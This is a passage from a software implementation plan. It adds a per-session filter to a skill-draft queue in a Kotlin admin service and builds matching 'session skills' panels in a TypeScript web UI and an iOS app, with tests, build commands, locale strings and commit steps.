    @Test
    @DisplayName("a conversation filter is a SQL predicate, not a trim applied after paging")
    fun `the session filter travels down to the query`() {
        TenantContext.setTenantId(3L)
        `when`(skillDraftMapper.selectDraftList(eq(3L), anyOrNull(), anyOrNull(), anyOrNull()))
            .thenReturn(listOf(storedDraft(tenantId = 3L)))

        service.page(status = "PENDING", name = null, sessionId = "ses-1", pageNum = 1, pageSize = 20)

        verify(skillDraftMapper).selectDraftList(eq(3L), eq("PENDING"), anyOrNull(), eq("ses-1"))
    }

    @Test
    @DisplayName("a blank conversation filter is dropped, not searched for")
    fun `a blank session id filters nothing`() {
        TenantContext.setTenantId(3L)
        `when`(skillDraftMapper.selectDraftList(eq(3L), anyOrNull(), anyOrNull(), anyOrNull()))
            .thenReturn(listOf(storedDraft(tenantId = 3L)))

        service.page(status = null, name = null, sessionId = "  ", pageNum = 1, pageSize = 20)

        verify(skillDraftMapper).selectDraftList(eq(3L), eq(null), eq(null), eq(null))
    }
```

`service`、`skillDraftMapper`、`storedDraft(tenantId = …)` 都是同文件既有成员，`when`/`verify`/`eq`/`anyOrNull` 的用法照 `:478-487` 那支抄。第二支里三枚 `eq(null)` 若推断不过，写成 `isNull()`（`MatchersKt` 两枚都在：`<T> eq(T)` 与 `<T> isNull()`）。两支都不许改成 `any()`——那等于什么都没断言。

- [ ] **Step 2: 跑测试确认失败**

Run: `... mvn -o test -pl harnax-admin -am -Dtest=SkillDraftServiceImplTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: 编译失败（`page` 只有 4 个参数）

- [ ] **Step 3: 三处签名**

`SkillDraftService.kt:38-43`：

```kotlin
/**
 * The queue, newest first.
 *
 * [sessionId] narrows the queue to one conversation's proposals, which is what a session panel asks for;
 * it is a SQL predicate rather than a post-filter because PageHelper counts the rows it hands back, so a
 * filter applied after paging would report a total that does not match the page.
 */
fun page(
    status: String?,
    name: String?,
    sessionId: String?,
    pageNum: Int,
    pageSize: Int,
): Page<SkillDraftResponse>
```

`SkillDraftServiceImpl.kt:208-227`：形参加 `sessionId: String?`，在 `:220` 之后加一行，并把 `:225` 的调用补上第 4 个实参：

```kotlin
val session = sessionId?.trim()?.takeIf { it.isNotEmpty() }
…
skillDraftMapper.selectDraftList(currentTenantId(), state, name?.trim()?.takeIf { it.isNotEmpty() }, session),
```

`SkillDraftController.kt:55-79`：形参加一枚可选参数（`:69` 的 `name` 之后），并把 `:73` 那唯一一处调用补上第 3 个具名实参——其余不动，含 `:74` 把缺省 status 兜成 `PENDING` 的既有行为（会话页要的正是一样一份待启用清单）：

```kotlin
        @Parameter(description = "Narrow to one conversation's proposals") @RequestParam(
            name = "sessionId",
            required = false,
        ) sessionId: String?,
```

```kotlin
            skillDraftService.page(
                status = status ?: SkillDraft.STATUS_PENDING,
                name = name,
                sessionId = sessionId,
                pageNum = pageNum ?: 1,
                pageSize = pageSize ?: DEFAULT_PAGE_SIZE,
            ),
```

- [ ] **Step 4: 加 IT —— 过滤只收会话，不松租户**

追加到 `harnax-admin/src/test/kotlin/com/agnetix/harnax/admin/it/SkillDraftFlowIT.kt`。夹具全部复用该文件已有的私有成员：`ensureSession()` 建的是本租户一枚 `web-` 会话，`submit(name, skillmd, sessionId = …)` 走的正是沙箱上报那条内部入口（`sessionId` 是它推租户的唯一来源），`records(query)` 取队列表，`exchange(..., tenantId = otherTenant)` 换邻居租户读。第二会话需要一支同租户的兄弟会话，用同一枚 agent 现建：

```kotlin
    /** A second conversation of the same tenant, so a session filter has something it should exclude. */
    private fun ensureSiblingSession(): String {
        if (siblingSessionUuid.isNotEmpty()) return siblingSessionUuid
        val agent = findInPage("/api/admin/agents/page", "name=it_draft_agent_$suffix") {
            it["name"].asText() == "it_draft_agent_$suffix"
        }
        assertNotNull(agent, "the first session's agent has to still be here")
        val title = "it_draft_session_sibling_$suffix"
        assertOk(postJson("/api/admin/sessions", mapOf("title" to title, "agentId" to agent!!["id"].asLong())))
        val session = findInPage("/api/admin/sessions/page", "keyword=$title") { it["title"].asText() == title }
        assertNotNull(session, "prerequisite sibling session should exist")
        siblingSessionUuid = session!!["sessionId"].asText()
        siblingSessionRowId = session["id"].asLong()
        return siblingSessionUuid
    }
```

用例（`@Order(11)`；`siblingSessionUuid = ""`、`siblingSessionRowId = -1L` 与既有 `sessionUuid` / `sessionRowId` 同处声明，即 `:61-62` 那一块）。**既有那支占用 `@Order(11)` 的用例是本文件最后一支，名为 `clearing the proposing session takes neither the approval nor the record of it`（`:453-487`），它必须继续排在最后**——它在 `:468` 用 `deleteJson("/api/admin/sessions/$sessionRowId")` 把出处会话删掉，任何还依赖该会话的用例排它之后都会红（`submit` 推租户要回查会话行）。所以新用例接 `@Order(11)`，把那支既有的改成 `@Order(12)`。这个文件**没有** `@AfterAll`，也**没有** `deleteSession(...)` 这种助手，唯一的删会话通道就是上面那句 `deleteJson`；兄弟会话因此由新用例自己在末尾删走，不留悬挂数据：

```kotlin
    @Test
    @Order(11)
    fun `the queue narrows to one conversation without loosening the tenant`() {
        val mine = submit("it_draft_ses_mine_$suffix", "# mine\n\nThis conversation's own proposal.\n")
        val sibling = submit(
            "it_draft_ses_sibling_$suffix",
            "# sibling\n\nAnother conversation's proposal.\n",
            sessionId = ensureSiblingSession(),
        )
        assertEquals(200, mine["code"].asInt(), mine.toString())
        assertEquals(200, sibling["code"].asInt(), sibling.toString())

        val names = records("sessionId=$sessionUuid&pageSize=100").map { it["name"].asText() }
        assertTrue(names.contains("it_draft_ses_mine_$suffix"), "the session sees its own nomination: $names")
        assertFalse(names.contains("it_draft_ses_sibling_$suffix"), "and not another conversation's: $names")

        // The new predicate narrows inside the tenant clause rather than replacing it.
        val foreign = parseBody(
            exchange(HttpMethod.GET, "/api/admin/skill-drafts?sessionId=$sessionUuid&pageSize=100", tenantId = otherTenant),
        )
        assertEquals(200, foreign["code"].asInt())
        assertTrue(
            foreign["data"]["records"].none { it["name"].asText().startsWith("it_draft_ses_") },
            "a neighbour tenant that guesses the session id still gets nothing of ours",
        )

        // This file has no @AfterAll: the session a test creates is the test's to remove. The primary session
        // stays, because the invariant-3 case after this one is the thing that clears it on purpose.
        assertOk(deleteJson("/api/admin/sessions/$siblingSessionRowId"))
    }
```

Run: `... mvn -o test -pl harnax-admin -am -Pintegration-test -Dtest=SkillDraftFlowIT` -Dsurefire.failIfNoSpecifiedTests=false
Expected: `Failures: 0, Errors: 0`（先决条件：Docker 在跑；本仓 IT 走 testcontainers）

- [ ] **Step 5: 跑 admin 门禁**

Run: `... mvn -q spotless:apply -pl harnax-admin && ... mvn -o test -pl harnax-admin -am`
Expected: `Tests run: 2432, Failures: 0, Errors: 0`（admin 基线实测 2430 ＋ 本任务 2 支 unit；Step 4 那支 IT 只在 `-Pintegration-test` 里跑，不进这一行的计数）

- [ ] **Step 6: 提交**

```bash
git add harnax-admin/src/main/kotlin/com/agnetix/harnax/admin/service/SkillDraftService.kt \
        harnax-admin/src/main/kotlin/com/agnetix/harnax/admin/service/impl/SkillDraftServiceImpl.kt \
        harnax-admin/src/main/kotlin/com/agnetix/harnax/admin/controller/SkillDraftController.kt \
        harnax-admin/src/test/kotlin/com/agnetix/harnax/admin/service/impl/SkillDraftServiceImplTest.kt \
        harnax-admin/src/test/kotlin/com/agnetix/harnax/admin/it/SkillDraftFlowIT.kt
git commit -m "feat(admin): 草稿队列可按会话过滤——SQL 谓词已有，service 与 controller 补上这一格"
```

---

## Task 11: webui 会话页「本会话自写技能」

**Files:**
- Create: `harnax-webui/src/services/ant-design-pro/sessionSkill.ts`
- Create: `harnax-webui/src/pages/session/components/SessionSkillsDrawer.tsx`
- Modify: `harnax-webui/src/pages/session/index.tsx:362-392,442-454`
- Modify: `harnax-webui/src/services/ant-design-pro/skillDraft.ts:10-26`
- Modify: `harnax-webui/src/typings.d.ts:678-707`
- Modify: `harnax-webui/src/locales/zh-CN/pages.ts`、`harnax-webui/src/locales/en-US/pages.ts`
- Test: `harnax-webui/src/pages/session/components/sessionSkills.test.ts`

**Interfaces:**
- Consumes: `GET /api/router/agent/session-skills/{sessionId}`、`POST /api/router/agent/session-skills/{sessionId}/{name}/enable`、Task 10 的 `sessionId` 过滤
- Produces: `sessionSkillsFor(drafts, enabled)` 纯函数；`SessionSkillsDrawer` 组件

- [ ] **Step 1: 写失败测试（纯函数，jest 单置约定同 `contextUsage.test.ts`）**

```ts
import enPages from '@/locales/en-US/pages';
import zhPages from '@/locales/zh-CN/pages';
import { readOutcome, refusalOf, sessionSkillsFor } from './SessionSkillsDrawer';

const queue = (records: { name: string; description?: string | null }[]) => ({
  code: 200,
  message: 'ok',
  data: { pageNum: 1, pageSize: 50, total: records.length, records },
});

const zone = (rows: { name: string; enabledAt?: string | null }[]) => ({ code: 200, message: 'ok', data: rows });

/** A refusal on the envelope, which is how both a guard rejection and a business failure reach the panel. */
const refused = (code: number): any => ({ code, message: 'refused', data: null });

describe('the session skill panel', () => {
  it('offers a draft that is not enabled yet and marks one that is', () => {
    const rows = sessionSkillsFor(
      [
        { name: 'invoice-fill', description: 'fills' },
        { name: 'other', description: null },
      ],
      [{ name: 'invoice-fill', enabledAt: '2026-10-08T10:00:00Z' }],
    );
    expect(rows).toEqual([
      { name: 'invoice-fill', description: 'fills', enabled: true, enabledAt: '2026-10-08T10:00:00Z' },
      { name: 'other', description: null, enabled: false, enabledAt: null },
    ]);
  });

  it('keeps an enabled skill whose draft the agent has already rewritten out of the queue', () => {
    const rows = sessionSkillsFor([], [{ name: 'gone', enabledAt: 'x' }]);
    expect(rows).toEqual([{ name: 'gone', description: null, enabled: true, enabledAt: 'x' }]);
  });

  it('names the five refusals apart by the locale id the drawer renders', () => {
    expect(refusalOf(403).id).toBe('pages.session.skills.refusal.dangerous');
    expect(refusalOf(409).id).toBe('pages.session.skills.refusal.limit');
    expect(refusalOf(410).id).toBe('pages.session.skills.refusal.noSandbox');
    expect(refusalOf(404).id).toBe('pages.session.skills.refusal.noDraft');
    expect(refusalOf(500).id).toBe('pages.session.skills.refusal.container');
  });

  it('lands a code it does not know on the copy that blames nobody', () => {
    expect(refusalOf(0).id).toBe('pages.session.skills.refusal.unknown');
    expect(refusalOf(429).id).toBe('pages.session.skills.refusal.unknown');
    // An undocumented code must not claim the draft is gone — it may only mean no sandbox or an expired login.
    expect(refusalOf(429).id).not.toBe(refusalOf(404).id);
    expect(refusalOf(0).id).not.toBe(refusalOf(410).id);
  });

  it('supplies both halves of the message for every code, known or not', () => {
    for (const code of [403, 409, 410, 404, 500, 0, 429]) {
      const refusal = refusalOf(code);
      // The drawer renders id + defaultMessage from one table entry; either half missing renders an empty toast.
      expect(refusal.id.startsWith('pages.session.skills.')).toBe(true);
      expect(refusal.en.length).toBeGreaterThan(0);
      expect(Object.hasOwn(zhPages, refusal.id)).toBe(true);
      expect(Object.hasOwn(enPages, refusal.id)).toBe(true);
    }
  });

  it('calls the session empty only when both reads answered', () => {
    expect(readOutcome(queue([]), zone([]))).toEqual({ unavailable: false, rows: [] });
    expect(readOutcome(queue([{ name: 'a' }]), zone([{ name: 'a', enabledAt: 'x' }]))).toEqual({
      unavailable: false,
      rows: [{ name: 'a', description: null, enabled: true, enabledAt: 'x' }],
    });
  });

  it('says the read failed rather than that this session wrote nothing', () => {
    // A guard 403 on the queue is a login problem, not an empty session.
    expect(readOutcome(refused(403), zone([]))).toEqual({ unavailable: true, rows: [] });
    // A transport error answers with no code worth naming, and must not be reported as an empty session either.
    expect(readOutcome(refused(0), refused(0))).toEqual({ unavailable: true, rows: [] });
  });

  it('keeps the half that answered when the other one refuses', () => {
    const nominations = readOutcome(queue([{ name: 'invoice-fill', description: 'fills' }]), refused(500));
    expect(nominations.unavailable).toBe(true);
    expect(nominations.rows).toEqual([
      { name: 'invoice-fill', description: 'fills', enabled: false, enabledAt: null },
    ]);

    const enabled = readOutcome(refused(401), zone([{ name: 'gone', enabledAt: 'x' }]));
    expect(enabled.unavailable).toBe(true);
    expect(enabled.rows).toEqual([{ name: 'gone', description: null, enabled: true, enabledAt: 'x' }]);
  });

  it('hands the read path no copy of its own, so it cannot render a refusal code', () => {
    // Listing is refused only by the guard or the transport; saying "the scan calls it DANGEROUS" here would
    // send the operator to the review queue. The read half therefore reports a flag, never a message.
    expect(Object.keys(readOutcome(refused(403), refused(500))).sort()).toEqual(['rows', 'unavailable']);
    expect(Object.keys(readOutcome(queue([]), zone([]))).sort()).toEqual(['rows', 'unavailable']);
  });
});
```

**第二轮修复要补的两件判据（Task 11 复审记下的）：**
- 上面每个 `refused(code)` 夹具都带 `data: null`，所以把 `readOutcome` 里那一层「这一半 code 不是 200 就当它没答」的过滤删掉，九条用例照样全绿。夹具要补一枚带非空 `data` 的拒因（`{ code: 500, message: 'x', data: [...] }`），断言那一半仍然不许进合并集。
- `load()` 用 `Promise.all`：一半在 HTTP 层抛出（JWT 过期时 admin 侧就是 401 而不是 200 信封）会把另一半分到的结果一起丢掉，与上面「keeps the half that answered」在真实通道上等价的保证落空，而 `:52-54` 的注释却已经这么写了。改 `Promise.allSettled`，把 rejected 的一半折算成非 200 的信封再交给同一个 `readOutcome`。


- [ ] **Step 2: 跑测试确认失败**

Run: `cd harnax-webui && NODE_OPTIONS=--no-experimental-strip-types TS_NODE_PROJECT=../harnax-ui-test/tsconfig.json npx jest src/pages/session/components/sessionSkills.test.ts`
Expected: FAIL，`Cannot find module './SessionSkillsDrawer'`

- [ ] **Step 3: service 层**

`sessionSkill.ts`（照 `chat.ts:47-60` 的 GET 形状 + `buildRouterOptions`；`buildRouterOptions` 在 `chat.ts:17-28` 未导出，本文件按 `workspace.ts:4-33` 的做法留一份同形私有实现，别改那两个文件）：

```ts
import { request } from '@umijs/max';

function getRouterApiKey(): string {
  try {
    const tokenInfoStr = localStorage.getItem('tokenInfo');
    if (tokenInfoStr) {
      const tokenInfo = JSON.parse(tokenInfoStr);
      return tokenInfo.routerApiKey || '';
    }
  } catch {
    // ignore
  }
  return '';
}

function buildRouterOptions(extraOptions?: { [key: string]: any }) {
  return {
    skipAuthorization: true,
    headers: { 'X-Api-Key': getRouterApiKey() },
    ...(extraOptions || {}),
  };
}

export async function listSessionSkills(sessionId: string, options?: { [key: string]: any }) {
  return request<API.Result<API.SessionSkillRow[]>>(
    `/api/router/agent/session-skills/${encodeURIComponent(sessionId)}`,
    { method: 'GET', ...buildRouterOptions(options) },
  );
}

export async function enableSessionSkill(sessionId: string, name: string, options?: { [key: string]: any }) {
  return request<API.Result<API.SessionSkillEnableResult>>(
    `/api/router/agent/session-skills/${encodeURIComponent(sessionId)}/${encodeURIComponent(name)}/enable`,
    { method: 'POST', ...buildRouterOptions(options) },
  );
}
```

`typings.d.ts` 在 `SkillDraftPage`（`:702-707`）之后加：

```ts
type SessionSkillRow = {
  name: string;
  description?: string | null;
  enabledAt?: string | null;
};

type SessionSkillEnableResult = {
  ok: boolean;
  name?: string | null;
  verdict?: string | null;
  findings?: number;
  count?: number;
};
```

`skillDraft.ts:10-26` 的 `pageSkillDrafts` params 类型加 `sessionId?: string`。

- [ ] **Step 4: 组件**

`SessionSkillsDrawer.tsx`：导出两个纯函数（测试的目标）加一个 Drawer，props 用 `WorkspaceDrawer` 的三元组形状（`visible / sessionId?: string / onClose`，`components/WorkspaceDrawer.tsx:22-26`）：

```tsx
export type SessionSkillEntry = {
  name: string;
  description: string | null;
  enabled: boolean;
  enabledAt: string | null;
};

export function sessionSkillsFor(
  drafts: { name: string; description?: string | null }[],
  enabled: { name: string; enabledAt?: string | null }[],
): SessionSkillEntry[] {
  const byName = new Map(enabled.map((row) => [row.name, row]));
  const rows: SessionSkillEntry[] = drafts.map((draft) => {
    const hit = byName.get(draft.name);
    byName.delete(draft.name);
    return {
      name: draft.name,
      description: draft.description ?? null,
      enabled: !!hit,
      enabledAt: hit?.enabledAt ?? null,
    };
  });
  byName.forEach((row, name) =>
    rows.push({ name, description: null, enabled: true, enabledAt: row.enabledAt ?? null }),
  );
  return rows;
}
```

```ts
/** One table over the five refusal codes: the locale id and the copy that id falls back to. */
const REFUSALS: Record<string, { id: string; en: string }> = {
  '403': { id: 'pages.session.skills.refusal.dangerous', en: 'The security scan says DANGEROUS, so this draft cannot be enabled' },
  '409': { id: 'pages.session.skills.refusal.limit', en: 'This session already has ten skills enabled' },
  '410': { id: 'pages.session.skills.refusal.noSandbox', en: 'This session has no running sandbox' },
  '404': { id: 'pages.session.skills.refusal.noDraft', en: 'This session has no draft with that name' },
  '500': { id: 'pages.session.skills.refusal.container', en: 'The container refused the copy' },
};

const UNKNOWN_REFUSAL = {
  id: 'pages.session.skills.refusal.unknown',
  en: 'The enable request was refused for a reason this panel does not know; the draft itself is untouched',
};

/** 未知码不许谎报「草稿不在了」——它可能只是沙箱没起来、登录过期了。 */
export function refusalOf(code: number): { id: string; en: string } {
  return REFUSALS[String(code)] ?? UNKNOWN_REFUSAL;
}
```

`refusalOf` 是这五枚拒因在 webui 里的唯一一份表，一枚 `code` 同时给出 locale id 与它的 `defaultMessage`；**不许再并列写一枚返回英文字面量的 `refusalMessage`**（两张 switch 加两份 locale 就是三处手工同步，而测试只能断言到不参与渲染的那一半）。测试因此断言 `refusalOf(code).id` 的落点与未知码的去向，不断言英文字面量本身。

Drawer 主体：`useEffect` 里并发取 `pageSkillDrafts({ status:'PENDING', sessionId, pageNum:1, pageSize:50 })` 与 `listSessionSkills(sessionId)`，业务失败按 `drafts.tsx:41-44` 的判据 `response.code !== 200 → throw`；`List` 渲染 `sessionSkillsFor` 的结果，每行右侧 `Button` 文案 `已启用 / 在本会话启用`，点击后 `enableSessionSkill` 再重拉两份。

两次读的失败与一次写的失败必须分开说：
- **取列表失败**（`pageSkillDrafts` 或 `listSessionSkills` 任一非 200）：置 `unavailable = true`，空态 `Empty` 的 description 用 `pages.session.skills.loadFailed`；`pages.session.skills.empty` 只在两份读都成功而合并结果为空时才出现。一份读失败另一份成功时，成功的那一半照常渲染，别把已经拿到的提名丢掉。列表这条路上只可能出守卫（401/403）与传输错，把 403 说成「安全扫描判定危险」会把人支使去审核队列而不是去登录——`refusalOf` 只给启用那一次调用用。
- **启用失败**（`enableSessionSkill` 返回非 200）：`message.error(intl.formatMessage({ id: refusalOf(response.code).id, defaultMessage: refusalOf(response.code).en }))`。

文案一律 `intl.formatMessage({ id: 'pages.session.skills.*', defaultMessage: '…' })`。

- [ ] **Step 5: 挂载点与 i18n**

`pages/session/index.tsx`：在 Artifacts 按钮块（`:383-392`）之后加一枚同形状按钮（`FolderOpenOutlined` 换成 `ThunderboltOutlined`），onClick `setSessionSkillsVisible(true)`；在 `:442-454` 的两个 Drawer 之后挂 `<SessionSkillsDrawer visible={sessionSkillsVisible} sessionId={selectedSession?.sessionId} onClose={() => setSessionSkillsVisible(false)} />`。

两份 locale 各加（zh 在 `pages.session.artifacts.*` 块之后，en 同位）：

```
'pages.session.skills.entry': '本会话技能' / 'Session skills'
'pages.session.skills.title': '本会话自写技能' / 'Skills written in this session'
'pages.session.skills.enable': '在本会话启用' / 'Enable in this session'
'pages.session.skills.enabled': '已在本会话启用' / 'Enabled in this session'
'pages.session.skills.enabledAt': '启用时间' / 'Enabled at'
'pages.session.skills.empty': '这个会话还没有自写的技能' / 'This session has not written a skill yet'
'pages.session.skills.loadFailed': '本会话技能读不出来' / "Could not load this session's skills"
'pages.session.skills.enableFailed': '启用没有成功' / 'Could not enable it'
'pages.session.skills.refresh': '刷新' / 'Refresh'
'pages.session.skills.refusal.dangerous': '安全扫描判定 DANGEROUS，这份草稿不能启用' / 'The security scan says DANGEROUS, so this draft cannot be enabled'
'pages.session.skills.refusal.limit': '这个会话已经启用了十个技能' / 'This session already has ten skills enabled'
'pages.session.skills.refusal.noSandbox': '这个会话没有运行中的沙箱' / 'This session has no running sandbox'
'pages.session.skills.refusal.container': '容器拒绝了这次复制' / 'The container refused the copy'
'pages.session.skills.refusal.noDraft': '这个会话没有这个名字的草稿' / 'This session has no draft with that name'
'pages.session.skills.refusal.unknown': '启用请求被拒绝，原因未登记；草稿本身没有受影响' / 'The enable request was refused for a reason this panel does not know; the draft itself is untouched'
```

英文侧含撇号的文案用双引号（`"Could not load this session's skills"`）；单引号包它会当场语法错。

- [ ] **Step 6: 跑闸门**

Run: `cd harnax-webui && NODE_OPTIONS=--no-experimental-strip-types TS_NODE_PROJECT=../harnax-ui-test/tsconfig.json npx jest src/pages/session/components/sessionSkills.test.ts && npx @biomejs/biome lint src/pages/session/components/SessionSkillsDrawer.tsx src/services/ant-design-pro/sessionSkill.ts src/pages/session/index.tsx && npm run build`
Expected: 测试 PASS、lint 无 error、`max build` 成功。类型接线以 `max build` 通过为准，**不跑 `npm run tsc`**（见 Global Constraints）。**不要 `biome check --write`。**

- [ ] **Step 7: 提交**

```bash
git add harnax-webui/src/services/ant-design-pro/sessionSkill.ts \
        harnax-webui/src/services/ant-design-pro/skillDraft.ts \
        harnax-webui/src/pages/session/components/SessionSkillsDrawer.tsx \
        harnax-webui/src/pages/session/components/sessionSkills.test.ts \
        harnax-webui/src/pages/session/index.tsx harnax-webui/src/typings.d.ts \
        harnax-webui/src/locales/zh-CN/pages.ts harnax-webui/src/locales/en-US/pages.ts
git commit -m "feat(webui): 会话页挂出本会话自写技能——待启用提名与已启用一份列表，启用即下一轮可用"
```

---

## Task 12: iOS 会话页同一块

**Files:**
- Create: `harnax-ios/Sources/HarnaxCore/Contract/SessionSkill.swift`
- Create: `harnax-ios/Sources/HarnaxAPI/SessionSkillEndpoint.swift`
- Create: `harnax-ios/Sources/HarnaxAPI/SessionSkillClient.swift`
- Create: `harnax-ios/Sources/HarnaxFeatures/Chat/SessionSkillsViewModel.swift`
- Create: `harnax-ios/Sources/HarnaxFeatures/Chat/SessionSkillsSheet.swift`
- Modify: `Sources/HarnaxFeatures/Chat/ChatView.swift:83-114`、`Support/HarnaxDependencies.swift`（`ChatViewModel.swift` 不动：面板的数据归它自己的 `SessionSkillsViewModel`，见 Step 5）
- Modify: `Sources/HarnaxCore/Contract/SkillDraftCataloging.swift:14-19`、`Sources/HarnaxAPI/SkillDraftClient.swift`、`Sources/HarnaxAPI/SkillDraftEndpoint.swift:15-24`（`page` 加一个 `sessionId: String? = nil` 形参与对应的 query item，Task 10 的 Admin 侧参数名就叫 `sessionId`；缺了这一枚，会话面板拿到的是全队列而不是本会话的提名）
- Modify: `Sources/HarnaxKit/Resources/zh-Hans.lproj/Localizable.strings`、`en.lproj/Localizable.strings`
- Modify: `App/HarnaxDebugScreens.swift`
- Test: `Tests/HarnaxCoreTests/SessionSkillTests.swift`

**Interfaces:**
- Consumes: Task 9 的两条 `/api/router/agent/session-skills/**`
- Produces: `SessionSkillReading` 协议（`read(sessionId:) -> SessionSkillRead` / `enable(sessionId:name:)`）、`SessionSkillsViewModel`、`chat.skills.*` 文案

- [ ] **Step 1: 写失败测试（Core 层判据，XCTest）**

本仓 iOS 测试全部是 XCTest（`Tests/` 下 142 处 `import XCTest`，无 Swift Testing），别写 `@Test` / `#expect`。合并判据只吃一个轻量 `SessionSkillRules.Draft`，不吃 `SkillDraftRow` —— 后者的成员式初始化器是 internal 且要填满 13 个存储属性，测试里造它得先解码 JSON 夹具（`SkillDraftRulesTests.swift:17-18` 就是这么做的），而这条判据与线格式无关，没必要背上游。

```swift
import XCTest

@testable import HarnaxCore

/// The session panel answers from two reads at once — Admin's PENDING nominations for this session and
/// agent-service's enabled directory — and a row has to say which of the two put it there.
final class SessionSkillTests: XCTestCase {

    private func draft(_ name: String, _ description: String?) -> SessionSkillRules.Draft {
        SessionSkillRules.Draft(name: name, description: description)
    }

    func testDraftOrderIsKeptAndEachRowCarriesItsOwnEnableState() {
        let rows = SessionSkillRules.merged(
            drafts: [draft("invoice-fill", "fills"), draft("other", nil)],
            enabled: [SessionSkillRow(name: "invoice-fill", description: nil, enabled: true, enabledAt: "2026-10-08T10:00:00Z")]
        )
        XCTAssertEqual(rows.map(\.name), ["invoice-fill", "other"])
        XCTAssertTrue(rows[0].enabled)
        XCTAssertEqual(rows[0].enabledAt, "2026-10-08T10:00:00Z")
        XCTAssertFalse(rows[1].enabled)
        XCTAssertNil(rows[1].enabledAt)
    }

    func testTheQueueRowKeepsItsTextWhereBothReadsHaveTheName() {
        let rows = SessionSkillRules.merged(
            drafts: [draft("invoice-fill", "fills an invoice")],
            enabled: [SessionSkillRow(name: "invoice-fill", description: "stale copy", enabled: true, enabledAt: "x")]
        )
        XCTAssertEqual(rows.count, 1, "one name is one row, whatever both reads said about it")
        XCTAssertEqual(rows[0].description, "fills an invoice")
    }

    func testAnEnabledSkillWhoseDraftHasLeftTheQueueStillShows() {
        let rows = SessionSkillRules.merged(
            drafts: [],
            enabled: [SessionSkillRow(name: "gone", description: nil, enabled: true, enabledAt: nil)]
        )
        XCTAssertEqual(rows.map(\.name), ["gone"])
    }

    func testEachRefusalIsNamedByItsOwnCause() {
        XCTAssertEqual(SessionSkillRefusal(code: 403).messageKey, "chat.skills.blocked")
        XCTAssertEqual(SessionSkillRefusal(code: 409).messageKey, "chat.skills.full")
        XCTAssertEqual(SessionSkillRefusal(code: 410).messageKey, "chat.skills.noSandbox")
        XCTAssertEqual(SessionSkillRefusal(code: 404).messageKey, "chat.skills.sourceGone")
        XCTAssertEqual(SessionSkillRefusal(code: 500).messageKey, "chat.skills.copyFailed")
    }

    func testACodeNobodyDocumentedDoesNotClaimTheDraftIsGone() {
        XCTAssertEqual(SessionSkillRefusal(code: 502).messageKey, "chat.skills.enableFailed")
    }
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `cd harnax-ios && swift build --build-tests --scratch-path /tmp/hx-ios-$(date +%s)`
Expected: 编译失败，`cannot find 'SessionSkillRow' in scope`

- [ ] **Step 3: Core 契约**

```swift
public struct SessionSkillRow: Identifiable, Hashable, Sendable {
    public let name: String
    public let description: String?
    public let enabled: Bool
    public let enabledAt: String?
    public var id: String { name }

    public init(
        name: String,
        description: String? = nil,
        enabled: Bool,
        enabledAt: String? = nil
    ) {
        self.name = name
        self.description = description
        self.enabled = enabled
        self.enabledAt = enabledAt
    }
}

/// The panel's one merge: the queue says what this session nominated, agent-service says what it enabled,
/// and a name present in both is one row that knows it is enabled.
///
/// Lives in Core so iOS and the console cannot drift apart on which read wins a field
/// (`harnax-webui/src/pages/session/components/SessionSkillsDrawer.tsx` does the same for the same rows).
public enum SessionSkillRules {
    /// The slice of a queue row this screen reads. Not `SkillDraftRow`: the merge has nothing to do with
    /// the wire shape, and building a wire row in a test means decoding a fixture.
    public struct Draft: Equatable, Sendable {
        public let name: String
        public let description: String?

        public init(name: String, description: String?) {
            self.name = name
            self.description = description
        }
    }

    public static func merged(drafts: [Draft], enabled: [SessionSkillRow]) -> [SessionSkillRow] {
        var remaining = Dictionary(uniqueKeysWithValues: enabled.map { ($0.name, $0) })
        var rows: [SessionSkillRow] = []
        for draft in drafts {
            let hit = remaining.removeValue(forKey: draft.name)
            rows.append(
                SessionSkillRow(
                    name: draft.name,
                    description: draft.description,
                    enabled: hit != nil,
                    enabledAt: hit?.enabledAt
                )
            )
        }
        // Enabled but no longer nominated: the agent rewrote or archived the draft after the enable. The
        // session is still using it, so the row stays.
        for (name, row) in remaining.sorted(by: { $0.key < $1.key }) {
            rows.append(SessionSkillRow(name: name, description: nil, enabled: true, enabledAt: row.enabledAt))
        }
        return rows
    }
}

public struct SessionSkillRead: Equatable, Sendable {
    public let rows: [SessionSkillRow]
    /// At least one of the two reads did not answer. Never collapses to「这个会话没写过技能」.
    public let unavailable: Bool
    public init(rows: [SessionSkillRow], unavailable: Bool) {
        self.rows = rows
        self.unavailable = unavailable
    }
}

public protocol SessionSkillReading: Sendable {
    func read(sessionId: String) async -> SessionSkillRead
    func enable(sessionId: String, name: String) async throws
}

public struct SessionSkillRefusal: Error, Equatable, Sendable {
    public let code: Int
    public init(code: Int) { self.code = code }
    public var messageKey: String {
        switch code {
        case 403: return "chat.skills.blocked"
        case 409: return "chat.skills.full"
        case 410: return "chat.skills.noSandbox"
        case 404: return "chat.skills.sourceGone"
        case 500: return "chat.skills.copyFailed"
        default: return "chat.skills.enableFailed"
        }
    }
}
```

- [ ] **Step 4: API 层**

`SessionSkillEndpoint.swift`（`base: .router`，路径参数走 `Endpoint.segment`）：

```swift
enum SessionSkillEndpoint {
    static let base = "/api/router/agent/session-skills"

    static func rows(sessionId: String) -> Endpoint {
        Endpoint(.get, path: "\(base)/\(Endpoint.segment(sessionId))", base: .router)
    }

    static func enable(sessionId: String, name: String) -> Endpoint {
        Endpoint(
            .post,
            path: "\(base)/\(Endpoint.segment(sessionId))/\(Endpoint.segment(name))/enable",
            base: .router
        )
    }
}
```

